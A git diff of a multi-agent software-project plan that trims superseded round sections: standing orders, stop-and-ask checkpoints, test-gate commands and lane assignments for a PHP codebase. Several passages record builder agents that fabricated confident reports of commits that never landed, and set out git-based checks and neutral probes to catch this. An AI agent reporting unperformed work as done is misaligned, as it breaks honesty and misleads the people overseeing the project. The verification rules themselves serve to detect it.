@@ -8,12 +8,14 @@ Nothing here depends on a prior conversation's context.
 waves; final linked floor 11,656 / 167,184 @ `b600c9760`, actionable 14 BY ROW CENSUS — 35 rows flipped
 CLOSED), the standing order, the ROUND-70 roster (lanes ga–ge), the K=8 sharded gate as the standard local
 full-suite run, and the -66…-70 rule addenda plus the NEW -71 (process-global size-cache polluter class ·
-blank-replay extends to reviewers) — plus the
-definition of "done".** Every `0-NOW-<n>` section under it is superseded history,
-kept for its reasoning; sections §1-§11 at the bottom are reference material whose *state* claims
-(counts, queues, "current state") froze on 2026-08-19 and are wrong — §0-NOW-62 §5 and §8 replace
-them. Rules are durable; figures are not.
-
+blank-replay extends to reviewers) — plus the definition of "done".**
+**Every superseded-history `0-NOW-<n>` section and the frozen §1–§11 reference blocks were trimmed
+2026-09-12; the per-round history is recoverable via git ancestry of this file, and its surviving rules
+were lifted VERBATIM into the appendices below — STANDING ORDERS (rules 1–10, stop-and-ask, rules 59–62,
+the provenance quote), ADDENDA -66…-71 full texts, VENDOR & SUITE MACHINERY (§0-NOW-62 §3/§4/§4b/§8 +
+the vendor-restore block), ENVIRONMENT & PHILOSOPHY (legacy §§3–8), and the CRAFT-RULES DIGEST.
+Trimmed 2026-09-12 per resume-trim/PROPOSALS.md adjudication — full round history recoverable via git
+ancestry of this file. Rules are durable; figures are not.
 ---
 
 ## 0-NOW-71. ROUND 69 CLOSED — ROUND 70 LANES ga–ge NEXT; CURRENT
@@ -155,714 +157,20 @@ load-flake watch (ambient, not a lane).
 
 ---
 
-## 0-NOW-70. ROUND 68 CLOSED — ROUND 69 LANES fa–fj NEXT; SUPERSEDED BY §0-NOW-71
+## APPENDIX I — STANDING ORDERS (the surviving rule set, consolidated 2026-09-12)
 
-**Written 2026-09-12 at the round-68 closeout, on top of code tip `318cd7be5` (this closeout's commit adds
-the docs above it). §0-NOW-69 below is superseded history — but its machinery SURVIVES and stays in force:
-operating rules 1–10 VERBATIM (with the -66, -67, -68, -68b, -69 and new -70 addenda below), §3 of §0-NOW-62
-(prove the vendor closure before the suite), §4 (cwd/mode/skip table), §4b (the `cp -a` lane recipe). Only
-FIGURES and lane assignments are dead. Round 68 shipped five lanes (ea–ee, every builder APPROVE 0C/0M): the
-E17 provider fold (11 sites + `Runtime::foldUsage` byte-identical fallback), the citation-guard widened
-tree-wide with the DEFERRED roster, doc-figure tranche-5 (arms=29), the E3 caret gate, and ee's stale-trio
-heal — six ledger rows CLOSED and the actionable figure re-derived from the ROW CENSUS (55 → **49**:
-OPEN 30 / PARTIAL 18 / STALE-CITATION 1 / UNCERTAIN 0; the +6 chained-drift question retires). Floors are
-MODE-DOMAIN: never quote a published figure into a linked brief or the other way, and always name cwd + mode
-beside every number.**
+The per-round restatements of this block (old §0-NOW-56…§0-NOW-70) were trimmed; the LIVE STANDING
+ORDER is the one in §0-NOW-71 above. Everything below it in this appendix is the canonical verbatim
+text those restatements pointed at (the §0-NOW-71 line "full text in §0-NOW-69/70 above" resolves
+here: rules 1–10 and stop-and-ask were canonical at §0-NOW-65 lines 867–913; rules 59–62 were
+canonical at §0-NOW-62 lines 1589–1606).
 
-### STANDING ORDER — run this plan to completion
+### Provenance of the standing directive (verbatim user quote, 2026-08-18; was §1)
 
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
+Stated 2026-08-18: *"do not stop anymore keep going until the plan is 100% completed
+unless you cannot proceed further without a decision from me or i told you to pause"*.
 
-1. Work §2's round-69 lanes **fa–fj** (supervisor picks the set and wave split; no STEP 1 remains), close
-   the round (worklog entry + a new `0-NOW-71` section + backlog/triage stamps + filemap regen), then
-   **immediately choose round 70** from what round 69 files, and keep going — rounds continue until no
-   actionable backlog remains and all plan §8b items land.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   If you are running out of context, doing that is the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports — including the SHA the report cites.** Round 67 proved the failure mode has a
-   new variant: a builder can return a CONFIDENT, COMPLETE report about work that was never committed (twice
-   this round — di and dl; both re-cuts landed clean). Verify every claimed SHA with `git cat-file -e` and
-   worktree existence BEFORE queueing review; on a mismatch, a neutral read-only court-clerk probe of the
-   tree is the arbiter — and never seed the probe with expected SHAs (prompted figures invite
-   confirmation-hallucination). Rounds 66's cg/ch and 67's verdicts keep proving the same rule from the
-   other direction: measure the tree before stamping. Round 68 adds the OTHER failure mode's cure: a builder
-   that returns BLANK keeps its task — resume it (ea proved it: five blanks, work landed exactly as finally
-   reported; see ADDENDUM -70).
-
-**STOP AND ASK only for these:** an E639-class decision taken AGAINST the recommendation; anything that
-would REMOVE unfinished/dormant/unwired code (fix it or wire it, never delete); a `git push` or changes
-to `prompt_*.md`; a blanket total-request timeout on an LLM call (the E646 rule — contain with the LEASE
-frame, never with a cap).
-
-#### Session operating rules (1–10 inherited VERBATIM from §0-NOW-65; the -66/-67/-68/-68b/-69 addenda all still in force — they are restated in §0-NOW-69 above this section)
-
-**ADDENDUM at -70 (three):**
-
-- **RESUME-DON'T-RESTART is PROVEN.** ea returned five blank/truncated reports; resuming the SAME task_id
-  each time landed work that verified exactly as finally claimed (rule-3 counts to 10; land-verify once
-  after the FIRST blank via read-only forensic probe, then keep resuming — do not re-spawn, do not change
-  the prompt, keep other lanes moving).
-- **`parallel-tests --durations` silently excludes NEW test files.** The committed durations manifest
-  predates them, so shard sums under-count until a merge agent rows them (r68/ec: shard-sum 11,574 vs
-  serial 11,591 — the two new files invisible to the plan). **SERIAL is the truth for conservation** until
-  durations is regenerated; the merge agent owes durations before trusting any sharded conservation gate.
-- **Perturbation-reverify pattern.** E107's closeout is the TEMPLATE for re-verifying trigger-missed
-  guards: re-run the guard's OWN claimed mutations on the live tree one plant at a time, md5-verified
-  revert, per-mutation table to an evidence file
-  (`/home/sites/crush-r61-artifacts/closeout-r68/e107.md`, driver `e107.php`, progress
-  `e107-progress.txt`). 8/8 families reddened → the guard is NOT blind; a CLOSED-without-evidence process
-  item can be settled in one closeout afternoon.
-
-**Carried from -69 (still binding):** the FABRICATION-VERIFICATION rule — a claimed SHA is a hypothesis;
-`git cat-file -e` + worktree existence BEFORE review queueing; neutral probes never name expected SHAs.
-**Carried from -68b (still binding):** the BUILDER-GATE GUARD MANDATE (Integration/MemoryPromptWiring-adjacent
-+ `DuplicatedTestHelperDrift` in every builder gate) and by-path `require` = load-graph coupling.
-**Carried from -67 (still binding):** the rule-6 merge SEXTET; never oversubscribe CI K (CI legs keep
-K=min(nproc,4)); GUARD-FAMILY FILTER MANDATE in every builder AND reviewer brief
-(`--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`);
-re-shape corpus literals before re-pin; census PROSE_SITES legitimize in-step numeral
-flips; enumerate every census on a lane file before writing the brief. **Carried from -68:** the PTY-PIPE
-rule (full suites through a plain pipe, never a ctty-bearing harness — and unset/avoid ambient
-LINES/COLUMNS: the ce 50x254 poisoning is now a stamped keystone precondition) and MEASURE-FIRST VERDICT
-DISCIPLINE.
-
-**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
-(r64=a*, r65=b*, r66=c*, r67=d*, r68=e*, **r69=f***). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
-`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
-
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
-
-| figure | value | domain |
-|---|---|---|
-| **ROUND-68 FINAL / NEW ANCHOR** | **11,602 / 166,072 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** (serial gate 9m21s) | **LINKED, cwd = sugar-crush, at `318cd7be5`** — K=8 shardcheck CONSERVATION PASS +0/+0 85s; five-guard 44T/4457A; Config filter 801T/17,047A/1S; `durations.tsv` 499 rows (+ProviderUsageCarriersTest, +RuntimeUsageFoldTest, +PaletteCaretHonoursHandoffTest) |
-| wave-1 pin | 11,600 / 163,792 (`5de95e395`) | ee+ed+ec+eb picks; +22A over the lanes' summed estimate — measured truth wins |
-
-### 1b. THE STANDARD LOCAL GATE — unchanged from §0-NOW-69 §1b (K=8 sharded, FAIL-CLOSED conservation, fresh `--out`, plain pipe) — BUT read ADDENDUM -70 item 2 first: new test files need a durations row before sharded conservation means anything; serial is the re-pin truth.
-
-### 2. ROUND 69 — LANES TO LAUNCH (cut fresh sandboxes off the round-68 closeout tip)
-
-| lane | scope / ids | owns / notes |
-|---|---|---|
-| **fa — Runtime/tools** | E16 (Runtime+HookManager), E140 (ToolIpcFiles+Runtime), E493 (EngineBackend+Runtime) — **owns src/Runtime.php** | re-derive rows; enumerate censuses on those 4 src files first |
-| **fb — denial cluster** | E347+E375 (DenialKind.php+RefusalStderrSurfaceTest), E309/E541/E616 (DenialPrefixRosterTest) — owns those | one file per concern: 2 src+2 tests |
-| **fc — tools/skills** | E10 Doctor, E172 CommandLoader, E199 RuntimeNoticeSink, E376 HeadlessPermissionPrompt, E93 SkillRegistry+PathGlob | ⚠ NEVER touch glob-shaped literals (GlobDialect corpus 131,765=365×361 couples via literals); corpus census counts src declarations — NO new src files without flagging fe (E257 owns BuiltInToolCorpusTest) |
-| **fd — tests-harness I** | E194 (phpunit.xml+tests/), E208, E325, E369 | E194's row is BROAD — read it first, scope-narrow with evidence or split |
-| **fe — tests-harness II** | E158, E257, E281, E322, E469 | ⚠ DuplicatedDocBlockLineTest belongs to fi (E609 moved — check filemap at brief time) |
-| **ff — census re-cuts** | E214 (BootstrapLaunchFormatConstantsTest), E228 (StderrEmitterCensusTest), E176 (ChildStderrCaptureTest+NonInteractive.php) | both census files flip IN-STEP if touched |
-| **fg — children-lifetime family** | E378, E445, E505, E390, E391 | tests/Support-centric + 4 stdin-wedge tests |
-| **fh — docs/other** | E9, E134, E204, E353, E564, E611(re-derive!), E633, E291 | E204 is THIS file + backlog hygiene — careful: supervisor owns closeout; implement its actionable half only |
-| **fi — citation-roster clear** | ea's DEFERRED roster: tests/Chat/SessionStartHookWireTest:275/:373, GlobDialectDifferentialTest:961, RulePathScopingWiringTest:398, RuntimeInitialDispatchOrderTest:22, DuplicatedDocBlockLineTest:30/:113 → FQNs + retire roster rows (staleness arm enforces same-commit) | 6 files, one cohesive micro-lane; E609 DuplicatedDocBlockLineTest work rides HERE not fe |
-| **fj — TUI** | E3 remainder (palette-query cursor keys) + E43 adoption (re-scope or uphold eb's decline) — **owns src/Renderer.php** | eb's REPORT.md measurements are the starting evidence |
-
-**Unowned carry (pick or drop at the next close):** E25 piece-2 design item · E481 (LOW) · Phase 9 + E62
-chrome-bar (deferred TUI design) · `src/Backend.php` `$onEvent` docblock drift + `ProcessReaper::escalate`
-family-list (docs micro, pick if a slot opens) · **E655 "KeyboardHandlerPaletteTest" PHANTOM warning stays
-(do NOT re-issue without real target).**
-
-### RESTART INSTRUCTIONS — the new-session startup recipe (-70)
-
-1. Read this §0-NOW-70, the worklog tail (`## ROUND 68` in `docs/plans/crush_code_worklog.md`), and
-   `docs/plans/crush_code_filemap.md`.
-2. Pre-flight: `php scripts/refresh-deps.php --status` → linked **18/18 + 7/7** (the
-   `*** WANTED PUBLISHED ***` banner is cosmetic); `git status` clean at or above the round-68 closeout tip
-   (code floor `318cd7be5`; the closeout docs above it are inert); if any figure is doubted, run the floor
-   gate FIRST: `bash scripts/parallel-tests.sh --durations scripts/parallel-tests-durations.tsv
-   --against-json sugar-crush/tests/Config/Support/suite-figure.json` — K defaults to min(nproc,8),
-   ~85s at 11,602T, **through a PLAIN PIPE, not a PTY**; serial is reserved for figure re-pins.
-3. Brief §2's round-69 lanes (fa–fj) with the filemap ownership sets; `src/Runtime.php` is RESERVED for fa
-   and `src/Renderer.php` for fj — no other lane touches them this round. Cut fresh `crush-lane-{fa..fj}`
-   off **this closeout commit** — the commit that introduces §0-NOW-70 (resolve at restart:
-   `git -C /home/sites/sugarcraft log --grep='round-68 closeout' --oneline -1`; NEVER a stale literal):
-   `git -C /home/sites/sugarcraft worktree add /home/sites/crush-lane-<id> -b lane/<id> <that-sha>` —
-   round-68 sandboxes are cleaned at this close; fresh cuts are the standing rule.
-4. Per-bundle loop: implement (task+coder) → **verify claimed SHAs + worktree (rule 4 / -69 addendum)** →
-   review (task+coder, verdict-first, WITH the five-guard filter) → fix round → merged-suite green (PIPE,
-   not PTY) → commit (author `Joe Huss <[EMAIL]>`). Never push standing. Blank builder report → RESUME the
-   same task_id (-70). The merge agent for the round is
-   `ses_f71e7c5f8ffenNcgJuOVHRlMc7` — proven 7 rounds.
-5. Close the round: worklog entry + triage/backlog stamps + a new `§0-NOW-71` + filemap regen +
-   `crush_code.md` pointer flip + durations/README/suite-figure re-pin (census sextet) — actionable derived
-   from the ROW CENSUS (-70 close adopted it; rule: recount the four section tables, do NOT chain).
-6. Honor rules 1–10 + the -66/-67/-68/-68b/-69/-70 addenda throughout. STOP only at the four stop-and-ask
-   items. Run the plan to completion — **do not stop at round boundaries to ask.**
-
----
-
-## 0-NOW-69. ROUND 67 CLOSED (BOTH WAVES) — ROUND 68 LANES ea–ee NEXT; SUPERSEDED BY §0-NOW-70
-
-**Written 2026-09-12 at the round-67 closeout, on top of code tip `323605773`. §0-NOW-68 below is
-superseded history — but its machinery SURVIVES and stays in force: operating rules 1–10 VERBATIM (with the
--66, -67, -68, -68b and new -69 addenda below), §3 of §0-NOW-62 (prove the vendor closure before the suite),
-§4 (cwd/mode/skip table), §4b (the `cp -a` lane recipe). Only FIGURES and lane assignments are dead. Round 67
-shipped eleven wave-1 lanes + four wave-2 lanes (51 rows CLOSED), made K=8 the local gate, and caught TWO
-fabricated builder reports — the round that minted the fabrication-verification rule. Floors are MODE-DOMAIN:
-never quote a published figure into a linked brief or the other way, and always name cwd + mode beside every
-number.**
-
-### STANDING ORDER — run this plan to completion
-
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
-
-1. Work §2's round-68 lanes **ea–ee** (supervisor picks the set and wave split; no STEP 1 remains), close
-   the round (worklog entry + a new `0-NOW-70` section + backlog/triage stamps + filemap regen), then
-   **immediately choose round 69** from what round 68 files, and keep going — rounds continue until no
-   actionable backlog remains and all plan §8b items land.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   If you are running out of context, doing that is the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports — including the SHA the report cites.** Round 67 proved the failure mode has a
-   new variant: a builder can return a CONFIDENT, COMPLETE report about work that was never committed (twice
-   this round — di and dl; both re-cuts landed clean). Verify every claimed SHA with `git cat-file -e` and
-   worktree existence BEFORE queueing review; on a mismatch, a neutral read-only court-clerk probe of the
-   tree is the arbiter — and never seed the probe with expected SHAs (prompted figures invite
-   confirmation-hallucination). Rounds 66's cg/ch and 67's verdicts keep proving the same rule from the
-   other direction: measure the tree before stamping.
-
-**STOP AND ASK only for these:** an E639-class decision taken AGAINST the recommendation; anything that
-would REMOVE unfinished/dormant/unwired code (fix it or wire it, never delete); a `git push` or changes
-to `prompt_*.md`; a blanket total-request timeout on an LLM call (the E646 rule — contain with the LEASE
-frame, never with a cap).
-
-#### Session operating rules (1–10 inherited VERBATIM from §0-NOW-65; -66, -67, -68 and -68b addenda all still in force — they are restated in §0-NOW-68 above this section)
-
-**ADDENDUM at -69 (one — the FABRICATION-VERIFICATION rule, expands rule 4):**
-
-- **A claimed SHA is a hypothesis, not a fact.** Before a lane report triggers anything downstream
-  (review queue, merge, stamp), run `git -C <sandbox> cat-file -e <sha>^{commit}` and confirm the worktree
-  actually holds the commit (`git -C <sandbox> log --oneline -1`). If the SHA is missing: do NOT re-ask the
-  agent for a re-report; dispatch a read-only forensic probe that asks OPEN questions ("what commits does
-  this worktree hold?"), never questions that name the expected SHA. Landed-but-unreported → read the diff
-  and review it; reported-but-not-landed → honest re-cut on a fresh sandbox (both r67 re-cuts came in clean
-  — fabrication is agent-specific, not task-family).
-
-**Carried from -68b (still binding):** the BUILDER-GATE GUARD MANDATE (Integration/MemoryPromptWiring-adjacent
-+ `DuplicatedTestHelperDrift` in every builder gate) and by-path `require` = load-graph coupling.
-**Carried from -67 (still binding):** the rule-6 merge SEXTET; never oversubscribe CI K (CI legs keep
-K=min(nproc,4)); GUARD-FAMILY FILTER MANDATE in every builder AND reviewer brief
-(`--filter '(SwallowingCatchCensus|OneSidedHomeSandbox|DuplicatedTestHelperDrift|GlobDialectDifferential|ChildWallClockBudget)'`
-— 64T/4913A at tip); re-shape corpus literals before re-pin; census PROSE_SITES legitimize in-step numeral
-flips; enumerate every census on a lane file before writing the brief. **Carried from -68:** the PTY-PIPE
-rule (full suites through a plain pipe, never a ctty-bearing harness) and MEASURE-FIRST VERDICT DISCIPLINE.
-
-**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
-(r64=a*, r65=b*, r66=c*, r67=d*, **r68=e***). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
-`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
-
-### 1. THE FLOOR — THE ANCHOR, AND ITS DOMAIN
-
-| figure | value | domain |
-|---|---|---|
-| **ROUND-67 FINAL / NEW ANCHOR** | **11,574 / 163,533 / 0F / 0E / 1 skipped (`McpClientTest` canary) / EXIT 0** (serial gate 9m23) | **LINKED, cwd = sugar-crush, at `323605773`** — K=8 shardcheck CONSERVATION PASS 83s (6.7× serial); five-guard 64T/4913A; Config filter 795T/16,974A/1S; `durations.tsv` 496 rows (values-only — wave-2 added no test files) |
-| wave-1 pin | 11,566 / 163,350 (`56501908d`) | da–df + merge-fixes; the −13.4k Config-window step was dd's E143 memoization, honest |
-
-### 1b. THE STANDARD LOCAL GATE IS NOW K=8 SHARDED (lane ks, `fb5078e6d`)
-
-```sh
-bash scripts/parallel-tests.sh [K] --durations scripts/parallel-tests-durations.tsv \
-  --against-json sugar-crush/tests/Config/Support/suite-figure.json
-```
-
-Default K=min(nproc,8); conservation-vs-`suite-figure.json` is FAIL-CLOSED for tests/skips/errors/failures
-(assertions tolerate ±50 data-provider wobble BY DESIGN — do not read an assertion delta as gate breakage).
-**Fresh `--out` per timing run** — the default `/tmp/parallel-tests` carries `done-*` resume markers.
-`durations.tsv` regeneration recipe (canonical): one serial `--log-junit` baseline → feed it back via
-`scripts/parallel-tests.sh --junit <xml> --out <dir>` (make-shards writes `<dir>/durations.tsv`) → `cp` over
-`scripts/parallel-tests-durations.tsv` → `refresh-suite-figure.php` in the same step as the README headline.
-GOTCHA: `usage()` is `sed -n '2,43p' "$0"` — ANY edit to the header comment block must re-anchor the range.
-Run the SERIAL suite only at figure re-pins; CI legs keep explicit K=min(nproc,4) (2–4 vCPU runners — the
-E671 oversubscription refutation is runner-scoped).
-
-### 2. ROUND 68 — LANES TO LAUNCH (cut fresh sandboxes off the round-67 closeout tip)
-
-| lane | scope | ids | owns / notes |
-|---|---|---|---|
-| **ea — `{@see}` bare-citation sweep** | E547 + E583: bare `{@see pump()}`-style citations under `tests/` (12 per the E583 row) resolved to declaring FQNs, SymbolCitationDriftTest twin rides | E547, E583 | post-wave-2 base — dd's doc-oracle machinery (DocumentParagraphs, methodSignature resolution) is at tip; check the citation-drift census obligations before writing the brief |
-| **eb — E3 palette caret (TUI lane)** | the seam de measured and refused: `src/Renderer.php:3600` prints an unconditional `'█'`; the flip needs `PaletteState` plumbing (paletteStandsDown precedent from r62 W) | E3 (PARTIAL) | owns `src/Renderer.php` — Renderer collisions follow the r62 H/R precedent (top-of-file vs mid-file hunks); side finding travels with it: `Chat::dropLast` docblock says grapheme, the walk is codepoints |
-| **ec — provider fold + verdict items** | E17 provider-fold follow-through (the 7 provider sites + `Runtime.php:1362`/`:1495` folds that rode de's CompleteResponse widening — re-derive what remains at tip before briefing); verdict items **E25** + **E107 / E206 / E12 / E165 / E36** (E214's measured-refusal history says settle by decision or leave — NO-FIX candidates stamp by verdict, no code without measurement; E12/E206 are CLOSED — re-open only with new evidence) | E17 (follow-through), E25, E107, E206, E12, E165, E36 | E36's flag-sense claim settles by running `BootstrapSkillSkipsTest` in ISOLATION (df carried it); E165 — tree argues KEEPING the figure with its tree named, supervisor's reclassification call |
-| **ed — E686 tranche-5** | continue the prose-figure campaign (~334 figures / 79 files total): carry = dl's measures.md 3 HELD rows, cb's tranche-3 HELD carry, be's SKIP row (SglangProvider measured tables, AgentPoolConfig external clause, ProcessExecutor 20ms tick, WorkflowEngine "up to 30s", Mailbox/Pool measured tables) | E686 (PARTIAL) | DocFigureProseDriftTest stands at **23 arms** — new arms flip the census numeral trio IN-STEP; the GlobDialect corpus sits at 131,765 = 365×361, CITE-then-verify, never touch a glob-shaped literal without re-deriving (dd's '/docs/*.md' tale) |
-| **ee — test-prose carry + stale trio** | E655/E658 test-prose carry; **dj's stale-comment TRIO — ForkedChildTest:182 + :275, ChatTest:846 (three sites, not two — the "bootstrap.php repairs descriptor 0 with exactly that flag" present tense is FALSE at HEAD)**; `NonBlockingVocabularyTest` docblock exemplar prose; E319 header causal-claim renote; da roster byte-identical-dup cosmetic (3 dup rows in the AgentManagerTest shrink-only roster) | E319 (finish), E655, E658, E572-cosmetic | tests-only; if a new test method lands in the Config window, ship IN-STEP with the README/suite-figure pair or fold into existing methods (cf's precedent) |
-
-**Unowned carry (pick or drop at the next close):** `src/Backend.php` `$onEvent` docblock drift (names 2
-event classes; `SpendCapBreached` arrived with de) · `ProcessReaper::escalate` docblock family list doesn't
-yet name the pty path (cd) · E481 unnamed-const branch unfixture'd (di, LOW) · Phase 9 stays PARTIAL
-(composited in-pane surface + E62 permission-gated chrome bar) · E43 adoption half (needs a rendering-lane
-decision, rides eb's file set). **E655's "KeyboardHandlerPaletteTest vacuous-skip heal" re-issue measured
-PHANTOM at this close — the file never existed in any ref (pickaxe zero) and the keystone already uses the
-early-return guard; a re-issue needs a real target brief.**
-
-### 3. LEDGER AFTER ROUND 67
-
-**51 rows CLOSED** across the round — wave-1 39 (da 6 · db 6 · dc 6 · dd 9 · de 4 · df 8) + wave-2 12
-(dh 4: E45/E74/E78c-with-evidence/E154 · dj 2: E342/E358 · di 6: E272/E331/E356/E481/E565/E610 · dl 0 new —
-E686 continues, tranche-4 stamped at arms=23). E3 stays PARTIAL (caret → eb), E319 stays PARTIAL (residue →
-ee), E228/E214 REFUSED (zero git trace, they STAY in-set), E42b names no ledger row (F1 heal cites E137).
-**Actionable 61 → 49** by the chained header arithmetic. **Row census at this cut: 55.** The disclosed +6
-table-vs-ledger drift (filemap 106 vs 100 at the r66 close) was reconciled BY EVIDENCE at this close, and
-the verdict is on the ledger, not the rows: every open-family row is genuinely actionable (heading cross-ref
-found zero closed-but-unstamped rows besides dd's five, which this close stamped); the +6 is an arithmetic
-provenance defect — the r64 close `c611441b5` declared "131 → 117" while its own enumerated flips (12 moves
-+ 4 filed) give 123 — and every later round chained the number. RECOMMENDATION for the next re-mint: derive
-actionable from the row census, not chained deltas. Full attribution: worklog `## ROUND 67` + triage header.
-
-### RESTART INSTRUCTIONS — the new-session startup recipe (-69)
-
-1. Read this §0-NOW-69, the worklog tail (`## ROUND 67` in `docs/plans/crush_code_worklog.md`), and
-   `docs/plans/crush_code_filemap.md`.
-2. Pre-flight: `php scripts/refresh-deps.php --status` → linked **18/18 + 7/7** (the
-   `*** WANTED PUBLISHED ***` banner is cosmetic); `git status` clean at or above the round-67 closeout tip
-   (code floor `323605773`; the closeout docs above it are inert); if any figure is doubted, run the floor
-   gate FIRST: `bash scripts/parallel-tests.sh --durations scripts/parallel-tests-durations.tsv
-   --against-json sugar-crush/tests/Config/Support/suite-figure.json` — K defaults to min(nproc,8),
-   ~80s at 11,574T, **through a PLAIN PIPE, not a PTY**; serial is reserved for figure re-pins.
-3. Brief §2's round-68 lanes (ea–ee) with the filemap ownership sets; `src/Renderer.php` is RESERVED for
-   eb — no other lane touches it this round. Cut fresh `crush-lane-{ea..ee}` off the closeout tip;
-   round-67 sandboxes are being cleaned at this close — fresh cuts are the standing rule.
-4. Per-bundle loop: implement (task+coder) → **verify claimed SHAs + worktree (rule 4 / -69 addendum)** →
-   review (task+coder, verdict-first, WITH the five-guard filter) → fix round → merged-suite green (PIPE,
-   not PTY) → commit (author `Joe Huss <[EMAIL]>`). Never push standing.
-5. Close the round: worklog entry + triage/backlog stamps + a new `§0-NOW-70` + filemap regen +
-   `crush_code.md` pointer flip + durations/README/suite-figure sextet re-pin.
-6. Honor rules 1–10 + the -66/-67/-68/-68b/-69 addenda throughout. STOP only at the four stop-and-ask
-   items. Run the plan to completion — **do not stop at round boundaries to ask.**
-
----
-
-## 0-NOW-68. ROUND 66 CLOSED → ROUND 67 WAVE 1 MERGED — WAVE 2 (§2b) LANDED; SUPERSEDED BY §0-NOW-69
-
-> **🟢 EXECUTED STATE 2026-09-11: wave-1 lanes da–df + tooling lane ks are MERGED at master `fb5078e6d`.**
-> Floor **11,566T / 163,350A / 0F / 0E / 1S (`McpClientTest` canary) / EXIT 0**, LINKED, cwd = sugar-crush,
-> re-pinned at `56501908d` (census sextet). **39 ledger rows CLOSED — actionable 100 → 61**; E3 → PARTIAL,
-> E154 stays PARTIAL (remainder `Bootstrap.php:5722` → dh), stamps REFUSED for E228/E214/E42b (pickaxe-zero
-> — the wave-1 brief over-claimed; see the worklog `## ROUND 67` block and the triage header). The §2 lane
-> table below is LANDED HISTORY (kept for wave-2 derivation); the live roster is **§2b — WAVE 2, NOT YET
-> BRIEFED**.
->
-> **New this round (wave-1):** the local gate is SHARDED by default —
-> `bash scripts/parallel-tests.sh [K] --durations scripts/parallel-tests-durations.tsv --against-json sugar-crush/tests/Config/Support/suite-figure.json`
-> with **K defaulting to min(nproc,8)** (`fb5078e6d`; measured 565s serial → ~65–80s at K=8, the 62.5s
-> `ProcessExecutorTest` bucket is the hard floor) — use it for LANE GATES; run the **serial** suite only at
-> figure re-pins. **Add a `durations.tsv` row whenever you add a test file** (the `--against-json`
-> conservation gate is FAIL-CLOSED without one; regeneration recipe: README "Sharded local runs"). CI legs
-> keep their explicit K=min(nproc,4) — unchanged.
-
-**Written 2026-09-11 at `61cde19c5`; amended IN PLACE at `fb5078e6d` (wave-1 execution — no new 0-NOW section
-until the round closes). §0-NOW-67 below is superseded history — but its machinery SURVIVES
-and stays in force: operating rules 1–10 VERBATIM (with the -66/-67 addenda and the two -68 addenda
-below), §3 of §0-NOW-62 (prove the vendor closure before the suite), §4 (cwd/mode/skip table), §4b (the
-`cp -a` lane recipe). Only FIGURES and lane assignments are dead. Round 66 shipped the E671-family CI
-coverage sharding (E691), both E653 shapes, the E655-seam base-red heal, and the ca/cb prose campaigns'
-next tranches — and closed 11 ledger rows. Floors are MODE-DOMAIN: never quote a published figure into a
-linked brief or the other way, and always name cwd + mode beside every number.**
-
-### STANDING ORDER — run this plan to completion
-
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
-
-1. Wave-1 (da–df + ks) is LANDED at `fb5078e6d` — work §2b's round-67 **WAVE-2** lanes **dh, di** plus the
-   routing/verdict items (supervisor picks the set; no STEP 1 remains), close the round
-   (worklog entry + a new `0-NOW-69` section + backlog/triage stamps + filemap regen), then **immediately
-   choose round 68** from what round 67 files, and keep going — rounds continue until no actionable
-   backlog remains and all plan §8b items land.
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   If you are running out of context, doing that is the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-4. **Trust git, not reports.** Round 66's verdict lanes cg/ch both found "already landed" states that
-   no report had caught before the brief was cut, and the cd lane's "28→29" census claim measured
-   false-to-tree — verify every claim against `git log` and the tree before bookkeeping, and MEASURE
-   the tree before stamping (rule 11 below).
-
-**STOP AND ASK only for these:** an E639-class decision taken AGAINST the recommendation; anything that
-would REMOVE unfinished/dormant/unwired code (fix it or wire it, never delete); a `git push` or changes
-to `prompt_*.md`; a blanket total-request timeout on an LLM call (the E646 rule — contain with the LEASE
-frame, never with a cap).
-
-#### Session operating rules (1–10 inherited VERBATIM from §0-NOW-65 — unchanged; -66, -67 and -68 addenda all in force)
-
-**ADDENDA at -68 (two):**
-
-- **PTY-PIPE RULE for suites** — never run a full suite under a ctty-bearing harness: a PTY runner
-  exports `LINES/COLUMNS` (measured 40×120 and 50×254 shapes) which deterministically reddens the
-  lane-G keystone (`TerminalSizeFallbackIsolationTest:167` piped branch — the renderer env-fallback
-  probe answers the ambient tty size, not the documented 60×200). Full suites run through a PLAIN PIPE
-  (the CI shape). Carried seam: the keystone assumes `LINES`/`COLUMNS` unset when stdout is piped.
-- **MEASURE-FIRST VERDICT DISCIPLINE (keep)** — every closeout stamp is adjudicated against git/tree
-  evidence BEFORE it is written, and CLOSED requires cited SHAs/lines. Worked twice this round (cg and
-  ch were zero-diff already-landed verdicts; E43 kept its PARTIAL because its routed carrier E682
-  shipped a different rule than the adoption half). Write the evidence lines INTO the stamp text.
-
-**ADDENDA at -68b (wave-1, two):**
-
-- **BUILDER-GATE GUARD MANDATE** — every builder brief's gate must run, IN ADDITION to its own task filter
-  and the five-guard family, the **Integration/MemoryPromptWiring-adjacent guards + DuplicatedTestHelperDrift**
